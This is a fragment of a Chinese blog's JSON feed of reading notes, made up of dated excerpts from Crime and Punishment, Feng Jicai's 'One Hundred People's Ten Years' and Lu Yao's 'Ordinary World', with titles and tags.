            "content_html": "<p>我是人，凡是人所具有的东西，没有一样是我没有的。</p>\n<h3 id=\"4-24\"><a class=\"markdownIt-Anchor\" href=\"#4-24\">#</a> 4-24</h3>\n<p>你靠你的思想得了多少钱了？你思考那一刻就能得到很多钱吗？</p>\n<p>那似乎可以克服一切了，也为那个 “似乎” 付出了自己的全部。</p>\n<p>他们总是用孔雀羽毛把人打扮得十分漂亮，直到最后一刻，他们总是只往好的方面，而不往坏的方面去想；虽然他们也预感到坏的一面，但是无论如何事先对自己的不说真话，单单是这么想一想，就使她们感到厌恶；他们挥着手逃避真理，直到最后一刻，直到那个被他们打扮得十分漂亮的人亲自欺骗了他们。</p>\n<p>她虽然只能靠面包和水度日，但她决不会失去她的灵魂，她可以将自己贵重的自由当作货色去交易，但她决不会出卖自己的灵魂。</p>\n<h3 id=\"4-25\"><a class=\"markdownIt-Anchor\" href=\"#4-25\">#</a> 4-25</h3>\n<p>那是为奢华而虚荣的买卖，不过是饥饿、虚荣、空乏的问题。</p>\n<p>他不清楚自己在做些什么。或许把人生完全丢开了。卑贱地忍受现实的命运，并且将一切烦闷加进自己的生命中，而放弃一切的活动、人生、爱情！</p>\n<p>他带着一种奋力、由内心的祈望，不自觉地去注视着眼前的一切东西，好像在找什么使他注意力分散似的；但他没有如愿，仍不住的陷入俯首沉思中。当他突地又抬头四望时，马上把自己刚才所想的什么，甚至他自己要往哪里走，也忘记了。</p>\n<p>他像一个被判了死刑犯似的走进屋里。他什么也不想，也不能想；但他忽然觉得他再没有意志的自由了，一切事情都在忽然地不可动摇的决定了。</p>\n<p>迷信的痕迹老是在他心中存在，几乎是不能断绝的。在这一切事中，他永远会被视为有什么神奇的东西，好像有什么特别的力量和巧遇同时发生之事降临似的。</p>\n<p>这个念头愈是可以决定一切，即立刻就变得愈恐怖，且愈发可笑。不论他内心的矛盾和所有痛苦，他是从来没有一刻会信任自己所进行的企图的。</p>\n<p>他反复地说，又烦恼的集中精神注视着他的四周，以确信什么事情他都没有遗忘。他觉得他的精神，最简单的记忆力消失了。</p>\n<p>这些都是长期养成的习惯，都相对的，这一切不过是形式而已。</p>\n<p>他想抓住一桩什么事情，好把心思贯注在上面，抓住一点别的事情，但他一点也不能。</p>\n<p>他不停的向前行走，为那些琐屑地事所麻烦，但他不知道如何做，该如何地尝试去做。一种新来的迫人感触渐渐地把他征服了，这是环绕他的一切无限的东西，也可以说是生理的反响–一种顽强的、愤慨的仇恨情绪。</p>\n<p>你受原则的支配，好像受弹簧的拘束似的；你不敢独立的改变。</p>\n<p>最令人烦恼的，不是他们说谎–人可以原谅说谎的–说谎是一件可喜的事情，因为通过它可求得实情–使人可恼的是他们说谎，而且相信他们自己的谎言。</p>\n<p>事实并不是就是一切 — 至少事情的一半，在于你怎么去对待这些事实。</p>\n<h3 id=\"4-26\"><a class=\"markdownIt-Anchor\" href=\"#4-26\">#</a> 4-26</h3>\n<p>一个可恶的地方 – 污秽、发臭、十分肮脏。那边曾发生过许多事情，那边住着各色各样的人物。我是为着一件不光彩的事才往那边去的。</p>\n<p>为善的心存在着，即使那在一种幼稚的形式中，虽然有大批的强盗，真诚总可以发现的，总之，实际是没有的，是渺茫的。</p>\n<p>许多无定见的都握牢了进步的主义，把他们所接触的事情都会牵强地解释他们自己的利益，以致全个主义的精粹都被弄坏。</p>\n<p>我们过惯了一切平凡不舒服的生活，于是一旦伟大的时刻来到，大家便露出自己的真相了。</p>\n<p>然而，认为你卑鄙的那个人，他本身就是卑鄙的。</p>\n<p>不论什么刺激，不论什么动人的感触，立即使他的神奇回复过来，但当没有刺激时，他的力气又很快消失了。</p>\n<p>你们都是一些空谈家，以难题来弄人的痴汉！只要你有一点小困难，你便时时想着，如一只母鸡抱着蛋。你们身上根本没有一点独立生活的象征，意志薄弱，毫无主见，你们血脉中只有脓，而没有血！</p>\n<p>他在十字路口站着，四下望一望，好像等待什么人给他决定一下似的。但四顾悄然，一切都死一般的寂寞。</p>\n<p>但他并没有感觉到，他全把精神专注在那突然在他胸口唤起的生活和力量的交互压制着一切的感触。此种感触和一个被判死刑，忽然又赫免了的人感触一样。</p>\n<p>一群人都在胡说八道，无法想象一个人胡说八道、信口开河到什么程度！不过，我们何尝不是自己在说三道四呢 /</p>\n<p>这些荒唐的政客们，他们硬要让一个人完全不露个性，而且那正合他们的胃口！不露个性，极力作出违背自己的行动。他们认为这才是最大的进步。</p>\n<p>走在自己选择的路上，即使是错的，也比走在别人为你选择的正确的路上要好些。</p>\n<p>我们只是一群人，但不见得要比天上的鸟儿好些。</p>\n<h3 id=\"4-27\"><a class=\"markdownIt-Anchor\" href=\"#4-27\">#</a> 4-27</h3>\n<p>我们喜欢靠别人的智慧过日子，这真是积习难改呀。</p>\n<p>普莉赫丽娅容易受感动，但并不感伤，她怕事，多退让，但也不十分过甚，她会让步，承认许多甚至和她的意见不同的事情，她也能够迁就。但是，无论在什么情况下，都不能迫使她逾越诚实，道义和信仰所约束的界限。</p>\n<p>就让他出去走走，呼吸一点新鲜空气吧，他的房里闷的慌…… 但在这边，人又到哪里去呼吸新鲜的空气呢？就是这边的街上，也好像关闭了的房屋似的。这是怎样的一个城市。</p>\n<p>在他们看来一切都是受环境的支配，其它都属非是。这是他们的口头蝉。</p>\n<p>他们不承认以历史上的方法来推进人类，最后会变成一个正经的社会，但他们信仰一种由数学的头脑所发生的一切社会制度，会立刻组织所有的人类，而即便正直无罪，较任何的方法都迅速！就是因为他们自始不赞成历史，除了丑恶和愚蠢之外什么也没有。他们把它都看成了愚蠢。</p>\n<p>活灵魂要求生命，灵魂会不听从机械的规则，灵魂是疑惑的对象，灵魂是退步的！但他们所需要的，虽然枯朽，而且是可用橡皮制成的，至少是死的，无意志，是屈辱的，而且不会反抗！结果他们便把一切事物都弄得机械和刻板了！</p>\n<p>有种人，他们有极端权利去毁坏道德与罪恶，法律并非为他们而设的。这种‘非常的’人的有权利…… 这不是一种官样的权利，是一种自己良心上决定超过某种障碍物里面的权利，而且那也只是实现他的理想时必须这样做的时候（这种理想有时也许足以拯救全人类）。</p>\n<p>事实上，人类中的这许多先贤和领袖的大半都犯有屠戮罪。</p>\n<p>宗旨，我确以为一切的大人物或者稍微异常于常人的人，这就是说能够讲句新话的人，从他们的性格上一定都是罪人 — 多少是的，否则，他们必不能超出常轨；如果常轨非他们所忍受的，我想，他们的确也不应当忍受。</p>\n<p>所谓公众，大约是性情迂腐而守法的人，他们在统治下生活，而且他被统治。我想，被人统治即是他们的本分，因为他们乐于做顺民。这种个人永远是当今的人，保存这世界，繁殖着人民。</p>\n<h3 id=\"4-28\"><a class=\"markdownIt-Anchor\" href=\"#4-28\">#</a> 4-28</h3>\n<p>只有一桩事是明白的，人类的一切等级和分类的外貌，一定是循着某种自然的法则。当然，这法则我们现在仍不明白，但我相信是会存在的，而且总有一天被人所察觉的。</p>\n<p>大多数的人类都是原料，靠着某种大的努力，靠着某种鬼崇的方法，靠着各种配合，仅只为着最后活要由一千人中弄出一个有一点点独立性的人而存在着。也许一万人中只有一个有些独立性，十万人中只有一个有更大的独立性的人。</p>\n<p>我是人，凡是人所具有的东西，没有一样是我没有的。</p>\n<p>我知道，无论是谁的意见，我都不怎么特别感兴趣，这就是我为什么没有成为一个庸俗的人的缘故，尽管在我们这个社会上，戴上顶庸俗的帽子倒是挺舒服的…… 尤其如果天生就喜欢戴这顶帽子。</p>\n<p>如果是这样的话，在这个世界上，人对人就只能做坏事，因为拘泥于某些习以为常的形式，反而没有权利去做一点好事了。这是荒谬的。</p>\n<p>有一些侮辱，杜尼娅，即使想要忘记，也是忘不了的。一切都有个界限，越过这个界限是危险的；因为一旦越过，就不可能在退回去了。</p>\n<p>谈论一个您不认识的少女的品德。这一切都是诽谤和下流的行为。</p>\n<p>皮特罗维奇出身贫寒，一旦出人头地，几乎是病态的习惯于自我欣赏，把自己的智慧和才能估计得过高，甚至有时会对镜顾影自怜。但是他在世上最爱惜和着重的，却是他靠劳动和使用一切手段获得的金钱，因为金钱使他得以跻身于社会地位更高的人们的行列。</p>\n<p>除了最必要的话，对什么谈话他都觉得讨厌。</p>\n<p>你过着自己痛恨的备件生活，同时自己也知道（只要睁开眼来看看），这样你既不能帮助任何人，也救不了谁，这难道还不可怕吗？</p>\n<p>索尼娅的处境是社会上的一种偶然现象，虽说，可惜，远不是个别的和特殊的现象。但是着偶然性本身，还有这一定的文化程度，以及她以前的全部生活，似乎这一切会在她一开始走上这条令人厌恶的道路的时候，立刻就夺去她的生命。</p>\n<h3 id=\"4-29\"><a class=\"markdownIt-Anchor\" href=\"#4-29\">#</a> 4-29</h3>\n<p>也许还是从她的少女时代，还是她住在家里，待在不幸的父亲和愁疯的继母身边，生活在饥肠辘辘的孩子们、以及可怕的叫喊声和责备声中的时候，就已经深深藏在她的心中了。</p>\n<p>在这间几乎一无所有的屋里暗淡地照着一个杀人犯和一个妓女，这两个人竟奇怪地聚在一起，一同来读这本不朽的书。</p>\n<p>你能跨过去的。你在自杀，你把一生都毁了，你自己的一生。你本来可以靠精神和理性生活，可现在却要死在干草广场上。不过如果你仍然独自生活，你会支持不住的。准会向我一样发疯的。</p>\n<p>做什么？破坏应该破坏的，一劳永逸，再没有别的了：自己肩负起受苦受难的重担！怎么，你不懂吗？…… 自己和权力，而主要的是权力！统治一切生灵的权力！溶脂人类社会的权力！…… 这就是目的。</p>\n<p>像我们这些这些中等的人，却容易发窘，不善于交谈，也就是说，都是些善于思考的人…… 是不是因为没有共同利益，还是因为我们都很正直，不愿意互相欺骗呢，这我就不知道了。</p>\n<p>并不仅仅是因为他无处可逃，所以才逃不出我的掌心，而是因为在心理上他不可能从我这里逃脱…… 由于自然法则，即使他有去处，他也决逃不出我的掌心。</p>\n<p>你没有事实，你只有毫无用处，毫无意义的猜测。</p>\n<p>最可怕的是想到，为了这样一件微不足道的小事，他当真几乎毁了，几乎毁了自己。</p>\n<p>那些多的不可计数的形形色色的庸人，思想及其幼稚，对什么都是一知半解，却又刚愎自用的人们当中的一个，他们转眼之间一定会附和最时髦的流行思想，为的是立刻把他庸俗化，为的是把他们有时的确以最真诚的方式为之效力的一切漫画化。</p>\n<h3 id=\"4-30\"><a class=\"markdownIt-Anchor\" href=\"#4-30\">#</a> 4-30</h3>\n<p>他本能的开始看透了，列别加尼科夫不仅是个庸俗和有点傻气的人，而且也许还是个撒谎的家伙，他一直在转述着一些偶尔听到过的东西。</p>\n<p>坐在人家的酒席宴前，却蔑视它，同样也蔑视那些请您的人。</p>\n<p>对于所有像您这样的人，这是一个障碍，最糟糕的是 – 还没弄清是怎么回事，就嘲笑别人！就好像他们完全正确似的！就好像他们有什么可以感到自豪似的！</p>\n<p>绿帽子，这是一切合法婚姻的自然结果，可以这么说吧，是对合法婚姻的改正，是对他的抗议，所以在这个意义上来说，甚至丝毫不含侮辱性的意思……</p>\n<p>许多穷人都是尽最后努力，把积攒下来的最后几个戈比都花在我们日常生活中人人必须遵守的某些社交礼仪上，他们这样做，只不过是为了 “不比别人差”，也为了不让那些人 “指责” 他们。</p>\n<p>她本来是会让环境给完全压垮的，但是要在精神上压垮她，也就使她畏惧，征服她的意志，却决不可能。</p>\n<p>因为她自己是个邋里邋遢的人，所以她不能判断什么是真正的高贵。</p>\n<p>她还是觉得，只要他在每个人面前都小心翼翼，温和而且顺从，就可以设法避免灾难。她的失望太严重了。她当然可以忍气吞声，几乎毫无怨言的忍受一切 – 就连这件事也能忍受。</p>\n<p>我是多么痛恨这间陋室！可我还是不愿走出这间陋室，故意不想出来，整天整夜足不出户，也不愿工作，连饭也不想吃，一直躺着。</p>\n<p>永远也等不到这一天，人们永远不会改变，谁也改变不了他们。</p>\n<p>怎么直到现在从来没有一个人敢于蔑视这一切荒谬的东西，摆脱它们的束缚，让它们见鬼去吧！怎么过去没有，现在也没有一个人敢于这么做呢？</p>\n<p>当她把自己的心都掏给他的时候，他却突然感觉到，而且意识到，他变得无比不幸，比以前还要不幸的多。</p>\n<p>疯子的机体并没有受到特殊损害，而疯狂这种症状，可以说是一种逻辑性的错误，判断的错误，不正确的看法。</p>\n<h3 id=\"4-31\"><a class=\"markdownIt-Anchor\" href=\"#4-31\">#</a> 4-31</h3>\n<p>有时病态的痛苦的担心完全支配了他，这种担心甚至会转变为惊慌失措的恐惧。不过他也记得，往往有这样的几分钟，几个小时，甚至也许是几天，支配着他的是一种与以前的恐惧恰恰相反的漠然态度 – 很像垂死的人那种病态的冷漠。</p>\n<p>地方越僻静，他就越发强烈的意识到，似乎有人就站在他身旁，让他感到惶恐不安，倒不是觉得可怕，然而不知怎的，让他感到十分苦恼，于是他赶快回到城里，混杂在人群中间。在这些地方似乎会反而觉得轻松些，甚至也更孤独些。</p>\n<p>有一件要求立刻解决的事情，然而这件事既无法理解，也不能用语言表达出来，一切都纠缠在一起，乱做一团。</p>\n<p>这一切积累在一起，毫无出路，压得人喘不过气来，痛苦不堪，使人昏昏沉沉，糊里糊涂。</p>\n<p>他不敢相信，也不相信，他贪婪的在这些仍然是语意双关的话里寻找并抓住更为确切、更为确定的东西。</p>\n<p>发生在我们时代的事，在这个时代，人心都变糊涂了；文章里总爱引用些会使一切 “焕然一新” 这句话，宣传人生的全部意义就在于过舒适的生活。这是书本上的幻想。</p>\n<p>害怕是可耻的。既然您迈出了这一步，那就要坚强起来。这是正义。请您按照正义所要求的去做吧。</p>\n<p>我是一个毫无希望的人，仅此而已。我大概是个有感情、也有同情心的人，大概也多少有点儿知识，不过已经毫无希望了。</p>\n<p>乡下人会逃跑，时髦教派的信徒会逃跑 – 这种人是别人思想的奴仆，所以只要让他看看指尖，那么不管要他怎样，他都会一辈子相信。</p>\n<p>您首先需要生活和一定的地位，还有适当的空气，那里空气对您合适吗？您逃跑了，还会自己回来的，您非有我们不幸。</p>\n<h3 id=\"4-32\"><a class=\"markdownIt-Anchor\" href=\"#4-32\">#</a> 4-32</h3>\n<p>您在看，可是无论是前面、还是两旁的东西，您已经什么也看不见了。最后，您嘴唇微微颤动，自言自语起来，有时您还伸出一只手，作着手势。</p>\n<p>在这种放荡生活里至少有一种固定不变的东西，它甚至是以天性为基础，而不是为幻想所左右，它犹如血液中永不熄火的炭火，永远燃烧着，还会烧很久，随着年龄的增长，或许也不能让它很快熄灭。</p>\n<p>要对某些人作出公正的判断，就得事先屏蔽那些先入为主的偏见，对通常在我们周围的人和事物，要改变那些通常的看法。</p>\n<p>不过当时，也就是说在刚认识的时候，您也知道，不知为什么，人总是较为轻率、也更愚蠢，看问题不正确，往往看不到实质。</p>\n<p>受过教育的青年人由于无所事事，沉湎于无法实现的幻想之中，而变得对一切都十分冷漠，曲解各种理论，自己也变得思想混乱，极不正常。</p>\n<p>他们的眼界就像他们的国土一样开阔，非常爱幻想，喜欢杂乱无章；然而只是眼界开阔，没有特殊才能，却是一种灾难。</p>\n<p>似乎，这些美学和舒适之类的问题，现在应该都无所谓了，可正是在这时候，却变得特别爱挑剔了，就像一头在类似的情况下…… 一定要给自己挑个地方的野兽。</p>\n<p>他什么也不想，而且也不愿想；然而幻想却一个接一个的出现，一个个困惑的片段，没头没尾，互不连贯，稍纵即逝，一闪而过，他似睡非睡。</p>\n<p>我想，既然在此以前我自然为是坚强的，那么现在也不要害怕耻辱。</p>\n<p>苦难和愚蠢的劳役会把我压垮，身体会衰弱的像一个老人，到那时我会比现在更有觉悟吗？到那时我还活着干什么？现在我为什么同意这样活着？</p>\n<p>他们一个个在街上匆匆来来往往，而就其天性来说，他们个个都是卑鄙的家伙，都是强盗；甚至更糟 – 都是白痴。</p>\n<p>使我感到恼怒的是，所有这些愚蠢，凶狠的嘴脸立刻就会围住我，瞪着眼睛直瞅着我，向我提出他们那些愚蠢的问题，对这些问题都得回答，他们还会深处手指来指着我。</p>\n<h3 id=\"4-33\"><a class=\"markdownIt-Anchor\" href=\"#4-33\">#</a> 4-33</h3>\n<p>这一切想必是多么平凡，现在我…… 关心这一切想必是多么微不足道！</p>\n<p>他心中感觉到的那种走投无路的苦恼和担心已经压垮了他，使他的精神崩溃了，所以他情不自禁，急欲抓住这个机会，来体验一下这种纯洁、充实、前所未有的感觉。</p>\n<p>他的话滔滔不绝，可是空空洞洞，听起来大半好像是些没有任何意义的响声。</p>\n<p>但是他过着这样恶劣和贫困的生活，完全不是按照什么偏执的计划或者什么企图，而只不过是由于对自己的命运漠不关心以及表面上的冷漠态度。</p>\n<p>他所以感到羞耻，正是因为他，拉斯科尼科夫，由于偶然的命运的判决，竟这样偶然，这样毫无希望，这样冷漠、这样糊里糊涂的毁了，如果他想多少安慰自己，那就得听天由命，逆来顺受，对某种判决的 “荒谬” 表示屈服。</p>\n<p>可是以前他就甘愿为思想，为希望，甚至为幻想成千次献出自己的生命了。他一向认为，单单生存是不够的；他总是希望生命有更大的意义。</p>\n<p>只要以完全独立、全面、摆脱世俗观念的观点来看问题，那么我的思想当然就根本不是那么奇怪了。</p>\n<p>不知为什么，他总是眼睛望着地下：周围的一切他看了就感到极端的厌恶，难以忍受。</p>\n",
            "tags": [
                "社会",
                "道德"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2019/07/01/BOOK/36%E3%80%8A%E4%B8%80%E7%99%BE%E4%B8%AA%E4%BA%BA%E7%9A%84%E5%8D%81%E5%B9%B4%E3%80%8B%E5%86%AF%E9%AA%A5%E6%89%8D/",
            "url": "http://www.n1h1l157.live/2019/07/01/BOOK/36%E3%80%8A%E4%B8%80%E7%99%BE%E4%B8%AA%E4%BA%BA%E7%9A%84%E5%8D%81%E5%B9%B4%E3%80%8B%E5%86%AF%E9%AA%A5%E6%89%8D/",
            "title": "《一百个人的十年》冯骥才",
            "date_published": "2019-06-30T16:00:00.000Z",
            "content_html": "<p>世上真正的聪明，往往是叫你事后慢慢悟到。</p>\n<h3 id=\"3-105\"><a class=\"markdownIt-Anchor\" href=\"#3-105\">#</a> 3-105</h3>\n<p>不管时代曾经陷入怎样的荒唐狂乱，一旦清醒就是向前跨了一大步。每一代人都为下一代人活着，也为下一代死。如果后世之人因此警醒，永远再不重复我们只一代人的苦难，我们虽然不幸也是活得最有价值的一代。</p>\n<p>世上最沉重的还是人的心。但他们守不住痛苦，渴望拆掉心的围栏，他们无法永远沉默，也不会永远沉默。这是为了寻求一种摆脱，一种慰藉，一种发泄，一种报复，更是寻求真正的理解。</p>\n<p>人性的弱点，妒忌、怯懦、自我、虚荣，乃至人性的优点，勇敢、重视、虔诚，全部被调动起来，成为了可怕的动力。它使我更加确认，政治一旦离开人道精神，社会悲剧的重演则不可避免。</p>\n<p>在无比强大的社会破坏力面前，各种命运的奇迹都会呈现，再大胆的想象也会相形见绌。</p>\n<p>以我的感受，大人物的经历不管多悲惨，也不能和小百姓相比。大人物的冤枉总容易解决，小百姓们如果没碰对了人，碰巧了机会，也许很难看得到命运的晴天。</p>\n<p>其实我不会出事，因为我像傻子一样已经什么都不懂了。不会思维，不知道时间，连他死没死的概念也不知道，恍惚只觉得自己是个动一动都很困难的肉体。</p>\n<p>人本来空手而来，空手而去，什么也不需要的。</p>\n<p>我尽量什么也不想，享受这一切。真恨不得这条路没完没了，一直走下去，几万里，几十年。</p>\n<p>我需要一种精神支持自己，鼓舞自己，把自己装满，否则你怎么活？</p>\n<h3 id=\"3-106\"><a class=\"markdownIt-Anchor\" href=\"#3-106\">#</a> 3-106</h3>\n<p>都说地狱十八层，我现在在哪一层？是不是到最底一层了。我整夜心里在叫 — 生活呵，你到底还有什么更糟的，先把最糟的叫我尝受行吗？</p>\n<p>我再没劲儿了。我发现，一个人，打起精神也是活着，心灰意懒也是活着；一次我从一面小镜子里看见自己满面灰尘，马上洗过，再看，依旧灰蒙蒙，无光，眼睛竟也没光泽。</p>\n<p>我感到我命运中的一切幸运，都是以双倍的牺牲为代价的。</p>\n<p>我喜欢文学，文学教会我理解别人和自己，认识社会和人生。但我也恨文学，它叫我太明白了，心里的负担也就更重。</p>\n<p>就是牺牲自己的爱情和人应有的尊严、权利，换一条生路，也未必好。因为这条路没有爱情。埋下这个种子，必然会有恶果。</p>\n<p>我一点也不觉得疼，一直也不觉得疼。眼泪也没有，就跟死了差不多。</p>\n<p>在灭绝人性的时代，人性的最高表达方式只有毁灭自己。</p>\n<p>好像睡了整整一个世纪，多少个日日夜夜积下的辛劳，一次成功就一扫而光。</p>\n<p>“文革” 就是过去的一切都不算，现在说你是什么就是什么。</p>\n<p>到现在我才知道，背上那石头仍然牢牢存在，一辈子也卸不下来。</p>\n<p>落实能落实什么呢？政治从来不对人的心灵负责。</p>\n<p>但我明白，她不会再有倾盆大雨，雷电交加的宣泄。年纪轻轻，却早把生活中最难承受的东西都消化过了。</p>\n<p>真正的残暴，是针对无辜。畸形的社会，智慧也是畸形的。</p>\n<p>世上真正的聪明，往往是叫你事后慢慢悟到。</p>\n<p>我要对你说的是在家里不能说，对朋友不能说，哪怕再好的朋友也不能说，这就是内心的痛苦吧。不是眼前的很强的痛苦，是一种没法摆脱，很深很深的痛苦。</p>\n<p>扭曲了爱情，就扭曲了一生。</p>\n<h3 id=\"3-107\"><a class=\"markdownIt-Anchor\" href=\"#3-107\">#</a> 3-107</h3>\n<p>那时候你干什么事，他们也找你麻烦，反正怎么也不对，都能找到错。</p>\n<p>只要我和孩子住，他就有盼头，不至于有别的想法。熬死熬活的熬吧。</p>\n<p>我们的精神都太脆弱了，再经不起任何折磨。这些年来，只有星星和月亮与我作伴，无依无靠。</p>\n<p>这十年毁灭不了的，都能永恒。</p>\n<p>人都是正常的，荒诞是生活的强加。换句话说，荒诞是生活的本质。</p>\n<p>一样东西带给你幸福，你要警惕–它必然同时给你带来不幸。</p>\n<p>连一个表情也不放过–它显示了文革的绝对权威。</p>\n<p>那些没有问题的同事对我没有笑容的表情，呼叫我名字时冷冰冰得像喊牲口的声调儿，我都习惯，这世界已经没有什么不能接受的了。当然，我还存在侥幸。因为我知道自己没犯过任何罪。谁知生活严峻的连侥幸也不给你。</p>\n<p>那时的政治犯，都不是为政治而去 “犯” 什么，而是政治需要的牺牲品。</p>\n<p>在那里边，有什么感情、希望、信念，都会成为自我折磨。我什么都不相信了，人活成这个样子，有什么意思。</p>\n<p>别的什么都没有，人就出来了。简单得和当初进去的情况一样，而且一样不明不白。</p>\n<p>生活超出人的想象的那部分是荒诞。</p>\n<p>今后要想不犯错误。凡是你特别爱看的那本书，那本书准有问题。</p>\n<p>我们成了他们利用的工具，可又身不由己，整个时代往前发展也许只能这么做。但我也恨，恨那时教我们盲从，教我们单线思维，不会多项思维，逆向思维。</p>\n<p>清查有什么用？挨清的还只是一些没根的，有根的照样动不了他。</p>\n<p>弱者依靠的只有法律。那么，法律依靠的是什么？</p>\n<p>祖祖辈辈留给我灵魂里的东西太多也太少。找来找去只有两个字，但这两个字几乎把我的灵魂占满。它就是：忍和善。</p>\n<p>就是这么简单、无聊。可是它成了我几十年家破人亡的祸根、祸源。</p>\n<p>如果一天你能把它清楚的说出来时，就不觉得苦了。痛苦就是因为你没有能力说清楚它。</p>\n<h3 id=\"3-108\"><a class=\"markdownIt-Anchor\" href=\"#3-108\">#</a> 3-108</h3>\n<p>那年月，拿活人都不当回事，拿死人就便不当一回事了。</p>\n<p>是性格悲剧，还是悲剧挑选出来的这种性格？</p>\n<p>大彻大悟也许是一种解脱，也许不是；也可能意味着更深更深的痛苦。什么是命运？就是冥冥之中你无法左右它，但它却在强有力的左右你的东西。</p>\n<p>我总是不知不觉在这漩涡般的怪圈里转，一会儿转出来，但没等我脱出身来，一会儿又给更深的卷进去。当然，这只是一个很具体的小怪圈。</p>\n<p>为了原则的斗争是必须的，但把个人的东西掺杂进去，不但搞垮了原则的神圣性，也误国误民。这就是个怪圈，最后剩下只是疲惫不堪的自己。</p>\n<p>整人的凶手们往往逍遥法外，做官的做官，这只不过是变相的销赃灭迹罢了。</p>\n<p>法律只能惩罚罪恶，却不能医治受害的心灵。</p>\n<p>在这场灾难中，死亡是最常见的事，留给人们的是无数问号后边的空白。</p>\n<p>我如果只想为自己，并不太难，放弃理想，志愿，随波逐流、平平庸庸一辈子下去就是了。难就难在你并不愿只为自己，还想为国家。</p>\n<p>但我总不能像那些人，睡懒觉，没事瞎吹牛，混日子反而落得平安无事吧。</p>\n<p>我必须扭曲自己，必须装傻装无能，装糊涂，叫人家看不上我，对我没兴趣才行。天天打磨自己的性格棱角，恨不得把自己藏在自己的影子里。</p>\n<p>这样的生活很乏味，很压抑。有时候觉得没有自己，好像自己被一种强有力的东西消化了：事业成了，自己却消失了。</p>\n<p>眼前又是一团乱，看不出头绪，总觉得有股不可抗拒的力量把自己往死道上推。我已是势如骑虎，退下来更美好，必须迎着头皮干，也就必须有实力，有实力就没人敢摸你。</p>\n<p>“文革” 就是不停止的翻来覆去，你上我下，你死我活，你喜我悲。</p>\n<p>任何人都是牺牲品 — 这就是那个奇特的时代。</p>\n<p>不是怕死，而是怕活，这便是那个时代的荒唐。</p>\n<h3 id=\"3-109\"><a class=\"markdownIt-Anchor\" href=\"#3-109\">#</a> 3-109</h3>\n<p>“不敢爱” 本身就是一出人间的悲剧，能把纯洁的爱变化成无知的恨，这种爱与恨的颠倒是残忍的。</p>\n<p>中国人的宗教不讲忏悔，没有忏悔，人会活得愈来愈狠，或愈来愈累。对于有心灵生活的人讲，没有忏悔就无法活。</p>\n<p>永远不要再单纯，永远不要再做违心的事。宁肯为真心付出惨重的代价，也不要为微信付出悲惨的代价。</p>\n<p>然而政治上的觉醒，并不能替代整个民族的彻底觉醒。至今牵绊改革双足的，仍有许多是深远地来自 “文革” 的结实的丝缕。不管是看得见的体制上的，还是看不见却牢牢潜在人们意识里的，而一切看得见的都存根于看不见的之中。我们民族也许苦难太久太深，总是避讳言之不及：而放弃教训的民族是没有希望的。</p>\n<p>只有叫后代人知道过去的一切，他们才会更透彻的认识到现实的一切，不迷失于身边纷杂的生活里，知道做什么和怎么做，把个人的人生信念和人类生存的永恒真理相统一。</p>\n<p>在这种苦难面前，人只能把人的一切全放下，把自己变成一个零，也就活下去了。如果你还认为自己是个人，那就很痛苦，甚至活不了。</p>\n<p>我觉得世界上最可怕的是空白，精神的空白。</p>\n<p>不去谴责专制这，反而去谴责受难者，这真叫人有点担忧。</p>\n<p>上帝从来没说忏悔可以洗清罪过。</p>\n<hr>\n",
            "tags": [
                "命运",
                "社会",
                "历史"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2019/07/01/BOOK/3%E3%80%8A%E5%B9%B3%E5%87%A1%E7%9A%84%E4%B8%96%E7%95%8C%E3%80%8B%E8%B7%AF%E9%81%A5/",
            "url": "http://www.n1h1l157.live/2019/07/01/BOOK/3%E3%80%8A%E5%B9%B3%E5%87%A1%E7%9A%84%E4%B8%96%E7%95%8C%E3%80%8B%E8%B7%AF%E9%81%A5/",
            "title": "《平凡的世界》路遥",
            "date_published": "2019-06-30T16:00:00.000Z",
            "content_html": "<p>因为贫穷，就以物遮目，变得如此愚蠢？</p>\n<h3 id=\"2-97\"><a class=\"markdownIt-Anchor\" href=\"#2-97\">#</a> 2-97</h3>\n<p>透过城市生活的镜面，他似乎更清楚地看见了他已经生活过十几年的村庄，在那个所熟悉的古老的世界里，原来许多有意义的东西，现在看起来似乎有点平淡无奇了。</p>\n<p>他们已经逛过更大的世界了，这条破败的街道时对他们来说已经没有吸引力了。</p>\n<p>她不怕这个家穷，她从小就习惯了。</p>\n<p>他慢慢懂得，人活着，就得随时准备经受磨难。</p>\n<p>孩子们一个个都懂事明理，长得茁茁壮壮的。这就是他生命的全部意义，这就是他活着的全部价值。</p>\n<p>山依然像他年轻时一样，没高一尺，也没低一尺。可他已经老了，也更无能了。</p>\n<p>对于像他们这样各方面都很脆弱的家庭来说，一件小事就可能导致灾难性的混乱，甚至使一切陷于瘫痪。</p>\n<p>他不仅要解决问题本身，还要安稳一家人的情绪。家里出了不幸事，他们都把希望寄托在他的身上，他怎么能辜负亲人们的期望呢？</p>\n<p>他没有办法制止这种荒唐的做法。</p>\n<p>而且是一个县的领导人，他也不得不做他反感的许多事！</p>\n<p>那双忧郁而好看的眼睛，现在即使面对面走过来，也不再那样叫人心儿悸动地看他一眼了。他不仅有肠胃的危机，现在，他精神上也出现了自己的危机。</p>\n<p>他是一个普普通通的人，应该按照普通人的条件正正常常的生活，而不要做太多的非分只想。当然，普通不等于庸俗。</p>\n<p>她感到一种说不出的委屈。她怀着一颗热腾腾的心，扑回村子来，准备交给她心爱的人，结果却连他的面也没有见上。</p>\n<h3 id=\"2-98\"><a class=\"markdownIt-Anchor\" href=\"#2-98\">#</a> 2-98</h3>\n<p>不管从哪方面看，这都是不可能的，因为不可能，也就不可能去想。</p>\n<p>温暖而幸福的激流很快就退朝了。他立刻就回到了自己所处的实际生活中。一切简单而又明白：这是不可能的！</p>\n<p>某种意义上，他们都在接受审判，他接受思想的审判，田福堂接受良心的审判。</p>\n<p>痛苦、烦恼、迷茫，他的内心像洪水一般泛滥，一切都太苦了、太沉重了。他简直不能承受生活如此的重压。</p>\n<p>生活的大剪刀是多么的无情，它要按照自己的安排来对每一个人的命运进行剪裁。</p>\n<p>尽管我们都是些普通人，无法改变我们国家的局面，但我们应该有一双分辨黑的眼睛，有一颗能严肃思考我们国家命运的头脑…… 